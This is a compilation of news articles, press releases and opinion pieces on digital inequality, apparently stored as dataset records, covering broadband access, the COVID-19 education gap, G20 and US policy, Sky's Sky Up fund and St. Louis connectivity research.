People in LDCs have been unable to access essential health care information during the pandemic. Moreover, LDCs in Africa have particularly been disadvantaged in terms of obtaining vaccines. By mid-September 2021, of the nearly six billion doses of vaccines distributed globally, only 2% have been injected in Africans. According to a recent report released by the United Nations, Africa faces a shortage of 470 million doses of vaccine in 2021.

Online education

Approximately 1.6 billion students around the world faced disrupted education in 2020. While online education and digital learning filled the gap during the COVID-19 shutdown, more than half of the world’s young people are “on the wrong side of the digital divide”. About 826 million students do not have access to a computer at home. The difference is particularly stark in LDCs. In sub-Saharan Africa, 89% of learners lack access to computers at home, and 82% lack internet access.

These growing digital divides and economic disparities in the COVID-19 era highlight the fact that technological revolution on its own cannot bring inclusive economic growth or distributional justice. On the contrary, technology often enhances the tension and animosity between the haves and have-nots both locally and globally.

The urgent need for U.S.-China joint action to combat digital divides and Covid-19

The priorities and perspectives of major powers differ significantly when it comes to cyber issues. But this should not prevent the U.S., China, and others from addressing common challenges such as digital divides. Major countries have the convening power to establish and reinforce international rules, norms, standards, principles, and codes of conduct. They also have greater financial and human resources to make combating digital divides feasible at the global level.

According to the Digital Economy Report 2019 released by the United Nations Conference on Trade and Development, prior to the COVID-19 pandemic, the U.S. and China accounted for 90% of the market capitalization of the world’s 70 largest digital platforms. Europe’s share was 4% while the combined share of Africa and Latin America was only 1%. Seven “super platforms” in the U.S. and China — namely Microsoft, Apple, Amazon, Google, Facebook, Tencent, and Alibaba — constitute two-thirds of total market value worldwide.

This may explain why there is so much resentment directed toward these “tech hegemons”. Probably for the same reason, about 50,000 Americans signed an online petition stating that Jeff Bezos should not return to earth after his space journey.

But unfortunately, we have hardly seen any significant joint efforts or “healthy competition” between the U.S. and China, on either the governmental or industrial fronts, to help combat digital divides in LDCs. Additionally, as the pandemic enters its third year, there has been a striking absence of governmental cooperation between the U.S. and China on COVID-19. Instead, some people in both countries have engaged in a blame game, fought propaganda wars, and promoted conspiracy theories.

Geopolitical fault lines are beginning to form, with technology being a central domain of competition and conflict. As former Google CEO Eric Schmidt and distinguished Chinese political scientist Yan Xuetong have respectively noted, there would be a “bifurcation into a Chinese-led internet and a non-Chinese internet led by America”, and the U.S. and China would not provide “joint global leadership for the emerging digital world”. Instead, the two countries are shaping what Yan calls “a duopolistic digital world” with two separate and competing centers.

These zero-sum competitions are extremely dangerous at a time of unprecedented technological revolution, especially with the rapid advance of artificial intelligence. In the digital era, neither America nor China, Russia or the EU can prevent a catastrophic cyberattack, which may not come from a major power, but from a marginalized group, a radical extremist, or even a “machine”.

Feasibility of US-China cooperation

For now, international joint efforts to combat COVID-19 — particularly in LDCs — should be a top priority. Policy makers in both Washington and Beijing should focus on the future instead of dwelling in the past.

The U.S. (with generous contributions from the private sector, NGOs, civil society organizations, and individuals) has already donated $4 billion to COVAX for vaccine distribution in the neediest foreign countries. China, as President Xi Jinping committed in his recent U.N. Assembly speech, will provide 2 billion doses of vaccine to foreign countries this year. In an international conference recently held in China, Chinese Vice-Premier Liu He called for “overcoming digital divides to achieve inclusive growth”.

The U.S. and China can complement each other in this effort. The U.S. has an extensive network of global health programs — through the Centers for Disease Control and Prevention (CDC), United States Agency for International Development (USAID), and other agencies — with a legacy of providing medical and public health support to the developing world. China has a strong capacity for manufacturing and logistics. Data-sharing and transparency remain imperative to fighting emerging variants and determining the efficacy and safety of vaccines and drug development, especially for those digitally disconnected countries.

It’s time for both countries to make common cause to ensure that the digital and increasingly interconnected world is built on a strong foundation of international dialogue, engagement, respect, distributional justice, humanitarianism and a sense of shared destiny.",Digital Inequality,2021-10-11 07:00:00

The G20 infrastructure working group meeting, which is part of the Infrastructure Working Group (IWG), was held again on 9-10 June 2022 to continue addressing the G20 agenda in the infrastructure sector. This 3rd IWD, which was conducted in a hybrid format in Nusa Dua, Bali, was attended by several representatives from member countries and international organizations. Other delegates participated in the discussion virtually.

The two-day meeting was conducted to offer updates on the progress of completion of deliverables and to receive further inputs from member countries. Co-chairs from Australia, Brazil, and the Indonesian Presidency expressed their appreciation of the good cooperation with international organizations as well as the contributions made by member countries in the completion of the deliverables of the six IWG agendas.

The 3rd IWG’s first day focused on three agendas: sustainable infrastructure investment, social inclusion and regional inequality, as well as post-pandemic transformative infrastructure. Several reports supporting the completion of deliverables have been completed and presented by international organizations, including the OECD’s Report on Advancing the Environment and Data for Sustainable Infrastructure Financing and the GI Hub’s Report on Infrastructure Transition Pathways, which support the IWG agenda related to sustainable infrastructure investment.

In addition to outlining the progress of deliverables, on the first day of the meeting, Swiss representatives highlighted their experiences in developing a sustainable infrastructure project. Indonesia, represented by PT Indonesia Infrastructure Finance (IIF), was also given the chance to present on bridging regional disparities (sub-national) through infrastructure development in Indonesia.

On the first day of the meeting, the Presidency and the Asian Infrastructure Investment Bank (AIIB) co-hosted a High-Level Seminar on Digital Infrastructure: Closing the Digital Divide, which featured Dr. Daron Acemoglu, a professor of economics from the Massachusetts Institute of Technology (MIT), as well as speakers from various countries, international organizations, and the private sector. The seminar addressed the issue of the digital divide, particularly from a regulatory standpoint, the role of the public and private sectors, as well as innovative financing structures in digital infrastructure development, all in keeping with the IWG agenda for digital infrastructure development.

In her remarks, Sri Mulyani, the Minister of Finance, emphasized the G20’s role in improving global digital infrastructure to allow digital transformation. “Some of the challenges in improving digital infrastructure,” she continued, “are how to build an integrated and innovative public/private financing scheme and a supportive domestic climate and a financial framework that attracts investment.” As a result, this meeting examined ways to overcome these challenges to improve global digital infrastructure and ensure an inclusive global recovery.

On the second day of the 3rd IWG meeting, three more agendas were discussed: Quality Infrastructure Investment (QII) indicators, digital infrastructure and InfraTech, and GI Hub governance.

Executive Summary

Both parties in Congress have recently indicated a desire to reduce the “digital divide”—the disparity between those with reliable internet access and those without—creating a rare opportunity for bipartisan policymaking.

The digital divide is a complicated issue, however, and policymakers must target their solutions to the variety of problems preventing internet access: It would cost $40 billion to reach the last 2 percent of households, access is not the same as connection, and myriad local issues present barriers to access and connectivity.

While focusing on reforming existing programs, such as Lifeline, to ensure they are appropriately targeted and fiscally responsible, policymakers must also be cautious of attempting to impose a single or overly prescriptive solution and should instead look to leverage nuanced, on-the-ground knowledge.

State and local policymakers should play an important role in bridging the digital divide by removing barriers to deployment and developing solutions that fit the unique needs of their communities.

Introduction

Both parties in Congress have recently indicated a desire to reduce the “digital divide” —or the disparity between those with reliable internet access and those without it. House Republicans on the Energy and Commerce Committee released a Broadband Connectivity Agenda, and House Democrats have indicated that closing the digital divide will be a goal in upcoming infrastructure proposals. The bipartisan desire to close the digital divide, particularly in light of the difficulties during the COVID-19 pandemic, provides an opportunity not only for short-term relief, but also lasting policy solutions. While politicians on both sides of the aisle appear eager to address the digital divide, they should be wary of overly prescriptive policies and should instead work to overcome the myriad challenges to internet access through policies that promote private-sector innovation and leverage local knowledge.

Understanding the Digital Divide

The digital divide is a complicated policy issue that will not have a simple, one-size-fits all solution.

Even the exact scope of the number of Americans impacted by the digital divide is debated. As of 2018, less than 6 percent (approximately 21 million people) of Americans still lacked access to broadband according to the FCC. Other studies suggest this number could be significantly higher. For example, a BroadbandNow study argues that the number of Americans without access is double the FCC’s figure at approximately 42 million (nearly 12 percent) when conducted at a more granular home or apartment-building level. Meanwhile, Microsoft alleges an even more dire picture, saying that their data indicate as many as 162 million Americans in 2019 lacked high speed internet. Many of the discrepancies arise due to debates about the accuracy of current broadband maps and what speed qualifies as “high speed internet.”

Further, achieving universal broadband access would be costly. In order to expand broadband access to every household, a 2017 FCC study found that it would cost an estimated $80 billion with $40 billion being needed to connect the last two percent of households. This figure assumes that households are connected using traditional, land-based broadband and uses the current definition of high speed. Changes to the means or metrics would impact costs (not to mention affect which households actually would need to be connected in the first place).

Improving access alone, however, does not fully solve the digital divide. Analysis of why people were unconnected prior to the pandemic indicated that, while cost was a factor for some, in many cases individuals who lacked internet connection chose to remain unconnected either because they did not want the internet or did not see it as important. While we do not yet have new data on choices around internet, many internet service providers (ISPs) have seen unprecedented demands both from new and existing customers during the pandemic. It is still difficult to know fully if this spike in demand represents changes in adoption or is merely a short-term shift.

The impact of the digital divide can be seen in all 50 states and in vastly different kinds of areas. While we often think of the digital divide or “homework gap” as rural issues, these concerns also impact urban low-income communities. This prevalence is in part because the digital divide does not exist merely from lack of access to broadband, but rather involves myriad issues that are often particular to the local area. The reasons for being un- or under-connected are not as simple as cost and availability. Individuals also need to be able to use the internet in a productive way and understand its benefits.

In order to find solutions to the digital divide, policymakers will need to approach it in multiple ways and at multiple levels of government. In addition to expanding access, they must also respond to underlying problems regarding adoption.

FCC Efforts to Help Bridge the Digital Divide

When it comes to the digital divide, the FCC can establish a framework that supports private investment in internet infrastructure and the development of innovative telecommunications solutions. To do this, it will need to maintain an approach that limits regulatory barriers and best utilizes limited resources such as spectrum.

Early in the pandemic, the FCC developed the Keep Americans Connected pledge, working voluntarily with providers to help Americans maintain internet connections. The FCC also approved on a bipartisan basis various initiatives to make additional spectrum available, particularly in rural and tribal areas, to enable companies to meet new demands. This last policy helped enable households to connect without laying new (and costly) broadband cables.

Such efforts are continuing in 2021. Most recently, the FCC unanimously authorized an Emergency Broadband Benefit program. This program will allow a variety of eligible households—including those currently qualified for the Lifeline program (a federal program that assists low-income households with the cost of communication services), receiving free or reduced school lunch benefits, or currently receiving Pell grants for higher education—to receive a discount of up to $50 per month ($75 per month for households on tribal lands) toward broadband service. It also provides eligible households a one-time discount of up to $100 to purchase a device such as a laptop, desktop computer, or tablet from participating providers if they contribute $10-$50 toward the purchase price. All broadband providers, not just those currently providing Lifeline benefits, can participate in this program. This program helps to solve one barrier to accessing the internet: cost, not only of internet service but also of the devices needed to connect.

These are short-term solutions, but the FCC should also look to lay the groundwork for longer-term solutions. Such policies include not only actions that increase access to traditional broadband but also policies promoting other internet connectivity options such as satellite internet and 5G. In some areas, the cost of deploying traditional broadband may be cost prohibitive. Other innovative telecommunications services may be able to provide the same (or perhaps even better) service without incurring these costs. For example, 5G will improve the connectivity experience and accessibility of videoconferencing and other data-intensive apps. This will be particularly important for those who rely on a mobile device for their only internet connection. In other cases, satellite internet may help to reach rural areas that would be difficult or costly to serve with traditional fixed broadband.

As the Biden Administration begins, its FCC should maintain the less intrusive regulatory approach that has allowed innovation and resulted in a robust internet infrastructure. The FCC should, for example, avoid placing unnecessary regulatory barriers on ISPs that could deter infrastructure investment by the private sector. For example, since the removal of “net neutrality” requirements, private investment has increased and the catastrophic predictions of the internet loading one word at a time failed to come true. Constant changes to the classification of ISPs could deter investment not only because of the additional requirements, but because of the regulatory uncertainty such a change creates. In attempting to close the digital divide, the FCC should be cautious about the impact that additional regulatory requirements might have on improving service and expanding deployment. Regulatory red-tape raises costs for deploying in areas that often are already more costly. Similarly, additional regulation can deter innovation and entrepreneurship in new technologies by raising costs and slowing the deployment process.

Opportunities for Congress to Help Bridge the Digital Divide

Congress should consider embracing this opportunity to reform existing programs that aid rural and low-income communities but should avoid proposals that seek to dictate the means of supplying internet access or presume that solutions will be the same for all communities. Still, Congress has an important role to play through existing programs that target those who may not otherwise be able to afford communication services.

Among the low-hanging fruit for Congress to consider is reforming programs such as Lifeline and the Universal Service Fund to provide more equal access and ensure funding is going to those who truly need it. For example, the current approach to the Universal Service Fund, a series of subsidies and fees for various programs to increase access to telecommunications services, can result in unequal distribution toward seemingly similar geographic regions particularly in rural parts of the United States. Lifeline can be difficult and cumbersome program for qualified individuals to access, and its limitations may not properly serve qualifying individuals’ needs when it comes to broadband access.

The current bipartisan momentum toward action provides opportunities to reform these programs in a way that better reflects today’s telecommunications needs and improves their accessibility and usefulness. Lifeline, for example, should be given the objective of broadband connectivity, targeted eligibility, a new finance source, and a capped budget. One potential solution would be to switch to a more accessible direct voucher program to eligible households and expand the providers with whom these funds are eligible to be used. These reforms would help increase adoption by eliminating complications and barriers to access and allowing more providers to compete for these consumers.

Congress should also build on the light-touch regulatory framework and seek to delegate decisions to those who understand the specific challenges to access. In many cases, it may find that state or local governments may better understand the unique problems facing their communities and are able to better target programs than a national program that may overly limit the use of funds or attempt to create government-sponsored solutions.

State Solutions: Removing Barriers and Responding to Community Needs

Policy solutions for the digital divide may vary depending on the needs of a community. As a result, state policymakers are uniquely positioned to develop creative solutions for the underlying issues in their particular areas that result in the digital divide. In some cases, there may be a lack of access that requires removing barriers to deployment. In other cases, the main challenge may be the cost of service or devices. State and local policymakers should examine how local policies may impact deployment and how they may be able to expand adoption in their own communities.

For states seeking to expand access, a multifaceted approach working with the private sector and local governments is often a successful way to improve broadband access in currently underserved areas. As a member of the Minnesota Governor’s Broadband Task Force noted, “No one entity has the resources to solve the problem on its own. No one knows it all.” In many cases, states provide funding to support expansion in currently underserved areas through various competitive grant programs after working with local leaders to identify their needs. These programs can encourage private-sector competition for areas that might otherwise be overlooked.

States may also need to examine their own regulatory barriers that may be preventing deployment. For example, Louisiana passed legislation that creates a “dig once” policy to lay fiber cable for broadband during other local construction projects and to allow rural co-ops to compete for broadband business. Such policy changes can reduce the cost of deployment and encourage more competition in currently underserved areas.

Reducing the digital divide does not always mean increasing broadband availability through deployment. State and local governments have also found creative policy solutions to address accessibility and adoption concerns, particularly around e-learning. Alabama issued vouchers to households with eligible students to ensure that every K-12 student could be connected, and one school district turned dormant school buses into WiFi hotspots that could move to different community locations for those that might not have internet access. Connecticut recognized that device access might also be a barrier and issued laptops as well as WiFi hotspots to every student who indicated such a need during the pandemic. While in many cases these are short-term solutions, they show that states and localities may find different solutions regarding the many aspects around accessibility, adoption, and devices—all of which contribute to the digital divide.

While pursuing solutions, state policymakers, like their federal counterparts, should avoid heavy-handed regulation and costly top-down proposals. Instead, they should embrace opportunities that remove barriers to deployment and empower families to pursue and adopt the right services for their needs. Lessons from short-term programs in response to the COVID-19 pandemic can provide insight for leaders into the various reasons digital divide exists in their communities and assist in the development of long-term solutions.

Conclusion

The digital divide is a complicated issue that will require policymakers at all levels to consider how they can enact policies that expand internet access and adoption. Federal, state, and local policymakers all have a role to play in developing solutions. In considering policy solutions, the best options will continue the development of a robust internet infrastructure and avoid options that limit choice or discourage innovation. These solutions should address not only access but also seek to make adoption easier for currently unconnected households. While addressing short-term concerns about the digital divide in the current pandemic, policymakers should use this opportunity to embrace policies that will support telecommunications innovation and investment to yield more lasting results.",Digital Inequality,2021-03-17 07:00:00

Sky is today setting an ambitious new goal to tackle digital inequality and provide support to a quarter of a million digitally excluded people through a new £10m fund.

The new program – Sky Up – will support people to succeed in a digital age, ensuring that those who are most at risk of being digitally excluded are given access to the right skills, technology, and connectivity. The program will see £10m invested to level up communities in the markets that Sky operates in and ensure no-one is left behind in the digital world.

Sky Up will be targeted directly at supporting the two groups who are most at risk of digital exclusion in our society, ensuring they are not held back by a lack of digital equity.

Under 25’s in low-income areas - research conducted by Ofcom during the pandemic, shows that one in five school children do not have consistent access to a suitable device for their online schoolwork. Sky Up will directly support young people under the age of 25 from lower income areas through digital training, reliable internet connections, and the right equipment to allow them to learn and succeed.

Over 65’s - the majority of people who are digital excluded are aged 65 and over, according to Age UK, and the greatest causes of digital exclusion amongst older people are lack of skills, a lack of trust, and not having a reliable internet connection. Working directly with local Age UK centers, Sky Up will be targeted at those over the age of 65 who lack the skills and confidence to get online safely, offering them advice and training to make the most of services and opportunities available online.

""Digital connections can unlock opportunities for those who are most excluded. Sky Up will give people in need a chance to create a better future.""

Sky Up will deliver 100 new Digital Hubs, powered by Sky’s broadband network and partner with local and trusted charities in the heart of the community to provide free internet access and digital skills support. Sky Up’s first two Digital Hubs will be located in Hackney, East London, and Leeds in Yorkshire, and will be delivered in partnership with Badu Sports and Age UK respectively.

Alongside Sky’s ambition to create 100 new Digital Hubs, Sky Up will include:

Sky Up Tech Grants – targeted to help young people between 16 and 25 who have left the care system to get and stay connected through a £550 individual grant. The recipients will receive a personal tech device pre-loaded with relevant software, an internet connection through Sky, and access to skills training.

– targeted to help young people between 16 and 25 who have left the care system to get and stay connected through a £550 individual grant. The recipients will receive a personal tech device pre-loaded with relevant software, an internet connection through Sky, and access to skills training. Through a major expansion of Sky Up Academy Studios, Sky aims to engage 20,000 students a year in its successful Academy Studios initiative which has already inspired 167,000 young people looking to work in the creative industries. The program will be expanded to a new site at Sky Studios Elstree and will be taken on the road to communities across the UK through a new e-vehicle mobile studio.

Sky’s ambition is part of parent-company Comcast’s ‘Project UP’ – a comprehensive initiative to advance digital equity and build a future of unlimited possibilities. Backed by a $1 billion commitment to reach tens of millions of people over the next decade, Project UP encompasses the programs and community partnerships across our organization that connect people to the internet, advance economic mobility, and open doors for the next generation.

The Minister for Tech and the Digital Economy, Chris Philp MP said: “Everyone, no matter their age or background, should be able to enjoy the huge benefits of digital technology - from learning, entertainment, shopping and doing business. I welcome Sky's ambitious skills program to tackle digital exclusion and help thousands of people up and down the country access the growing benefits and opportunities of going online.""

Nana Badu, CEO and founder of Badu Sports, said: “During lockdown we all truly understood the gap in digital equality for the most underserved communities. The new Sky Up digital studio in Hackney is an important solution to start closing that gap. We are delighted to be partnering with Sky who are seeking deeper impact when it comes to tackling digital inequality.”

Iain Anderson, CEO of Age UK Leeds, said: “We are very grateful for the support provided by Sky. This is a fantastic opportunity to support many older people to become digitally connected and to develop new skills. By having this facility, we will be better placed to reduce loneliness by enabling older people to remain socially connected and to assist them in accessing a range of services which are increasingly only available online.”",Digital Inequality,2022-04-22 07:00:00

When I talk to my parishioners, they speak about how much of their lives have transitioned online and are frustrated about not having reliable access.","One of the primary responsibilities of being a faith leader is to listen to your community, understand its problems, and provide support in challenging times. Particularly during the pandemic, it has been hard not to notice that my parishioners, and folks across the country, are divided into two groups: those with access to the internet, and those without.

In 2022, digital inclusion is still something we strive for in poor and rural areas throughout America. The lack of reliable internet access is an enormous disadvantage to so many people in all facets of their lives.

To fully participate in today’s society, all people, no matter who they are and no matter where they live, must have access to the internet. Think of the remote learning every child had to experience when schools were closed, and the challenges that families faced when they didn’t have access to a quality connection.

It’s a question of plain fairness.

Politicians have been talking for decades about bringing high-speed internet access to everyone, however many families continue to be left behind. More than 42 million people across the country lack affordable, reliable broadband connections, and as many as 120 million people who cannot get online are stuck with slow service that does not allow them to take advantage of everything the internet has to offer.

People of color are disproportionately affected by lack of broadband access

Lack of broadband disproportionately affects communities of color, as well: 35 percent of Americans of Latino descent and 29 percent of African-Americans do not have a broadband connection at home.

Every person in rural towns, urban neighborhoods, and tribal communities needs and deserves equal and full economic and educational opportunities. Studies show that students without home access to the internet are less likely to attend college and face a digital skills gap equivalent to three years’ worth of schooling. Small businesses, which are the cornerstone of rural and urban communities alike, need broadband to reach their customers and provide the service they expect.

Simply put, having access to the internet in every community is vital to its ability to succeed in the 21st century.

Fortunately, we have an opportunity to take major steps toward a solution. Last year, Congress passed President Biden’s Infrastructure Investment and Jobs Act, which provides $65 billion to expand broadband access and affordability. It is essential that we use this money to connect as many unserved and underserved communities as we can – and as quickly as we can.

Different places need different options to bridge the digital divide

As we bridge the digital divide, we must listen to those who have been left behind and make sure that we deploy solutions that fit their needs. Different places need different options – so it’s important that all voices are heard, and the technology that works best for the community is made readily available.

All people need access to broadband to learn, work, shop, pay bills, and get efficient healthcare.

When I talk to my parishioners, they speak about how much of their lives have transitioned online and are frustrated about not having reliable access. They do not care about the nuances of how we bring broadband to everyone. They just want to have it now – and understandably so.

This means that we must explore all solutions possible to provide high-speed broadband with the connection and support they need, when they need it, regardless of where they live.

Now is the time to meet those struggling where they are, stop dreaming about bridging the divide, and just get it done. Our government has a rare opportunity to fix an enormous problem, using money already approved for the purpose. Let’s make sure they do so in a manner that works for the communities they’re trying to help.

Students who lack access to digital tools and connectivity are more likely to miss out on up-to-date information from the web, essential education milestones , and access to resources, tools, and edutainment.
The increasing gap in the digital divide has significantly undermined access and delivery of education.
Governments Need to Improve Affordability of Digital ResourcesAccording to the United Nations, governments can become powerful instruments in bridging the digital divide by ensuring affordable, easy-to-use technologies.
Addressing the Gender Digital DivideAccording to the World Bank, there is a special need to reduce the gender digital divide in 2022 and beyond.","Technology has become a crucial part of our lives today, paving the way for a large window of opportunities for all people. And in recent years, our eyes have opened to its impact on students and schools. Students can now learn, work, research, collaborate, and independently develop knowledge largely because of the advent of the internet and information technology.

However, although technology has offered many benefits, it does come with its problems. In the case of education, that includes the digital divide.

The digital divide refers to the inability of all to have equal access to technology in order to experience learning, where the wealthy have this access, and those from middle- and low-income backgrounds do not. This technology includes hardware such as mobile devices, televisions, and personal computers, as well as connectivity to the internet, such as access to data and Wi-Fi.

It also includes the inequality in being able to use technological equipment and resources in the first place.

Every student is entitled to have adequate access to educational resources and support services to improve their academic performance. Recently, however, the education sector has felt the immensity of the digital divide, with half of the 1.5 billion students affected by the COVID-19 pandemic lacking access to computers and the internet. This is despite a global need to adopt remote learning in order to adhere to social distancing protocols.

As of September 2021, according to UNESCO, about 117 million students were still out of school due to mandated lockdowns. The impact of the digital divide continues to be felt globally, as 1.3 billion school-age children around the world do not have internet at home to access learning resources. This is especially evident in low-income communities, like those in sub-Saharan Africa — where 71% of teachers are unable to access tools, resources, and internet for remote learning and 89% of learners do not have a computer at home.

Students who lack access to digital tools and connectivity are more likely to miss out on up-to-date information from the web, essential education milestones , and access to resources, tools, and edutainment.

This lack of access has the potential to affect children for the rest of their lives, as according to Business Insider, without quality remote education, they will not have the same access to quality jobs.

The increasing gap in the digital divide has significantly undermined access and delivery of education. As we start a new year, here are six initiatives that can help improve — and even possibly eliminate — the technology gaps in education globally.

1. Governments Need to Improve Affordability of Digital Resources

According to the United Nations, governments can become powerful instruments in bridging the digital divide by ensuring affordable, easy-to-use technologies. The high cost of internet connectivity, the price of technological devices, electricity tariffs, and taxes are major contributors to the digital divide for both teachers and students.

With the COVID-19 pandemic disrupting global economies, it is projected that aid to education may drop by an estimated US$2 billion by 2022 , according to UNESCO.

In the coming years, based on recommendations from American University’s School of Education, educational leaders and policy makers need to continually liaise with governments and big corporations on ways to improve financing to help schools, learners, and teachers afford access to digital technologies for learning. This will help boost the expansion of information technology infrastructures, and reduce the cost of internet access.

2. Digital Skills Acquisition and Empowerment for Schools, Teachers, and Students

With digital competence becoming increasinly intertwined with our lives, an alarmingly high number of people still lack basic level technical skills and competencies, putting them at a disadvantage, according to the Digital Divide Council.

Teachers and students need to be fully trained on how to effectively use what the internet and modern technologies have to offer. The less students can use these tools, the more the digital divide widens. This is why the United Nations is launching a new global initiative focused on improving the digital learning and skills of children and youth — some 3.5 billion by 2030 — in marginalized communities.

Going forward, educational leaders can also actively help by surveying the needs of stakeholders, formulate action plans with policy makers, provide skills acquisition training, connect with potential digital resource partners like telecoms companies, and assign appropriate resources to continuously bridge the gap, according to American University.

3. Digital Literacy Awareness

The general public needs to be enlightened on the economic and social development benefits of integrating technology into the education space. The World Bank reports that there's value in many people seeing a need to become digitally active.

To fully reap fruitful results, governments should also create opportunities for feedback through which the masses can share their views, needs, and opinions about how they wish to see improvements.

Creating more awareness for digital literacy by building user confidence, explaining the benefits of utilization, and understanding security and privacy constraints have a proven positive impact on education outcomes.

4. Inclusion of Local Languages in Education Content Creation

Educational online content creators should aim to make information available in as many languages as possible. According to the World Bank, when users are confident that they can see content in their native or local languages, they are more inclined to use similar tools that provide personalized benefits.

Content creation tools and language translation resources can cushion the language digital divide, and at the same time create opportunities for better and more accountable support to all categories of learners needing it most.

5. Improving Opportunities for Learners With Disabilities

Specially designed assistive and adaptive technologies — such as screen readers, magnifying devices, augmentative, and alternative communication devices that aid persons with difficulties in verbal communication, telecommunication relay devices, interactive white boards, close captioned videos, and more — can boost independence, participation , technology equity, and access to quality education for learners with disabilities.

These technologies make education easily accessible to all categories of learners.

6. Addressing the Gender Digital Divide

According to the World Bank, there is a special need to reduce the gender digital divide in 2022 and beyond. For example, in South Asia, there are 26% more male mobile phone users than women. Barriers and constraints in accessing the internet impede women's and girls' full involvement in the social and economic progress of their communities and countries. In 2021, we witnessed long-standing development gaps between men and women moving online, with about 1.9 billion women not having access to the internet globally.",Digital Inequality,2022-01-05 08:00:00

For the report on the likely future of COVID-19, the ISC assembled 18 international experts from fields such as virology, public health, economics, and sociology, along with two observers.
Disruptions to education and the “digital divide” in relation to access to quality remote schooling are important issues arising from the COVID-19 pandemic.
“The COVID-19 pandemic has demonstrated the value of international scientific cooperation, even in the face of cascading environmental risks and geopolitical tensions,” says Mami Mizutori, special representative of the UNDRR.","Increased societal inequality and other negative effects of the COVID-19 pandemic could continue well into the future unless there is enhanced global cooperation, a new report from the International Science Council (ISC) has warned.

“We must not take a narrow view of the pandemic or minimise its impacts beyond public health,” says Peter Gluckman, president of the ISC. “Otherwise, inequities will grow, and the broader consequences will be felt in every society in every country.”

The ISC is an international non-governmental organisation comprising memberships from global scientific unions and associations. Its mission is to “act as the global voice for science”. The new report was produced with support from the United Nations Office for Disaster Risk Reduction (UNDRR) and the World Health Organization (WHO).

For the report on the likely future of COVID-19, the ISC assembled 18 international experts from fields such as virology, public health, economics, and sociology, along with two observers. The group developed three plausible scenarios for the next five years of the pandemic. This involved identifying the factors that would influence or be influenced by the pandemic, areas of uncertainty, and how all these factors fitted together.

What future scenarios did the report look at?

The first scenario described in the group’s report was labelled the “Continuity scenario” and is considered the most likely. In effect it would be business as usual. Under the continuity scenario, in 2027 the world would have effective vaccines and an adequate supply of boosters but vaccine access in low-income countries and vaccine hesitancy worldwide would still be problematic. COVID-19 would be a global endemic disease with seasonal surges, necessitating the use of some public health and social measures to control its spread during surge periods. Trust between citizens and governments and social cohesion would have been weakened by the pandemic.

The second scenario, considered more pessimistic but still plausible, is called “Missed recovery”. Under this scenario, inequality would continue to increase, and countries would have failed to cooperate regionally and globally to respond to the pandemic. COVID-19 booster vaccines would exist but would only be available to some, and low-income countries would have limited access to vaccines and antivirals. More restrictive public health and safety measures such as lockdowns would be likely, as countries fail to invest in health and social care systems. Finally, progress towards the UN Sustainable Development Goals (SDGs) would have been “severely” slowed.

The third scenario, “Collaboration plus”, is more optimistic than continuity, but plausible with the right policy decisions, according to the report. Under this scenario, high levels of international collaboration would allow more than 70% of the world’s population to access an effective COVID-19 vaccine, and antivirals would be cheap enough to be available in low-income countries. Restrictive public health and social measures would not be necessary to control the spread of the virus, and high-income countries would have invested in improving health and social systems, as well as in a “green recovery” from the pandemic. Governments would prioritise disaster preparedness and science advisory mechanisms, leading to a world better prepared for future crises.

What did the report recommend?

Following the development of the three five-year scenarios, ISC consulted with 17 international policy experts and hosted a workshop to identify policy decisions and recommendations which would get the world closest to the most optimistic scenario.

“The report aims to assist all governments in exploring appropriate responses in the broad interests of all their citizens and societies,” explains Gluckman.

The report highlighted that while most governments had prioritised direct medical responses to COVID-19, such as the development of vaccines and antivirals, not enough attention has been paid to the educational and economic effects of the pandemic.

The report noted that in 2020 an estimated 8% of working hours were lost, or the equivalent of 255 million full-time jobs. Citing a 2021 World Bank report that suggested COVID-19-related disruptions to education could lead to up to $US17 trillion in reduced earnings over the lifetimes of affected students, the report called for education to be prioritised in recovery strategies, including closing the “digital divide” of access to education.

Another area identified as requiring improvement was policies to combat disinformation and increase societal trust in science.

Overall, the report emphasised the need for greater collaboration as the key to avoiding the less desirable future scenarios.

“The COVID-19 pandemic has demonstrated the value of international scientific cooperation, even in the face of cascading environmental risks and geopolitical tensions,” says Mami Mizutori, special representative of the UNDRR.

“We must renew efforts to build a multilateral system that addresses inequalities while preparing us for the next crisis. Whether it be another pandemic, climate change, or conflict, we have the chance to learn from the last two years. If not, the Sustainable Development Goals will slip out of reach.”",Digital Inequality,2022-05-17 07:00:00

But this shift hasn't helped the close the digital gap in the US, according to recent research.

In fact, it has revealed the full impact of tech inequality as children without a home computer or tablet are now also lacking access to school resources and educational opportunities.

Despite the fact entire companies and school systems have had to move online during the pandemic, a new report by Common Sense Media reveals that the digital divide continues to persist in the U.S.

33 percent of American kids living in lower income households do not have access to a family computer - in comparison to only 6 percent of high income families who do not. It’s a similar story for kids with access to tablets, where 60 percent of children from lower income families have access to one, versus 81 percent of children from more affluent families. According to the Pew Research Center, broadband gaps in the U.S. also feed into the problem, and are particularly prevalent in low income households.

With children needing to join classes online throughout the pandemic, as well as to logon to complete their homework, this has moved beyond an issue of access to tech, and also become one of access to education. The digital divide works to deepen inequalities that already exist within communities, threatening to leave kids in poorer households behind, and making it harder for them to catch up.

The Biden administration’s infrastructure bill of 2021 set aside $65 billion for broadband infrastructure deployment. While this is certainly a step in the right direction, according to the Harvard Business Review, it fell far short of what was needed to give high speed internet access to every person in the country.

More than half of all households in St. Louis and St. Louis County are affected by the digital divide, according to the report .

“We've known for a decade or more in this country that the digital divide was problematic, but it was really COVID that brought it home,” said Kathy Osborn, president and CEO of the St. Louis Regional Business Council.

The report was commissioned by the Regional Business Council and the St. Louis Community Foundation.

Large portions of the St. Louis region have only one internet service provider, and that is often expensive and low quality, according to the report. It also found many families don’t have devices to connect to the internet and need training to use the technology.

“It was amazing and sobering to see what we thought we knew backed up with this kind of data,” said Kristen Sorth, director and CEO of the St. Louis County Library. “We've got to figure out a long-term solution that is reliable, affordable and that we teach people how to use.”

These issues are especially problematic for education in St. Louis; as children were asked to learn from home over the past two years, many districts found big gaps in students’ abilities to log on.

“As a school system, we're not in a vacuum,” said University City Superintendent Sharonica Hardin-Bartley. “We had devices, we had hotspots. We quickly noticed that if the neighborhood where students and families live doesn’t have the infrastructure, the devices don't work.”

Students in north St. Louis County districts including Jennings, Normandy Schools Collaborative and Riverview Gardens, along with St. Louis Public Schools, face some of the biggest challenges.

“We need to look at the most vulnerable communities and prioritize them,” said Hardin-Bartley. “We need to invest. It is a resource issue.”

The digital divide is often a reflection of income inequality in the St. Louis region, the report found. It also has economic implications, Osborn said.

“When you talk about business and workforce, if we lose the whole era of children because they don't have the technology they need to be fully educated, that ultimately is going to affect who's coming into our workplace,” she said.

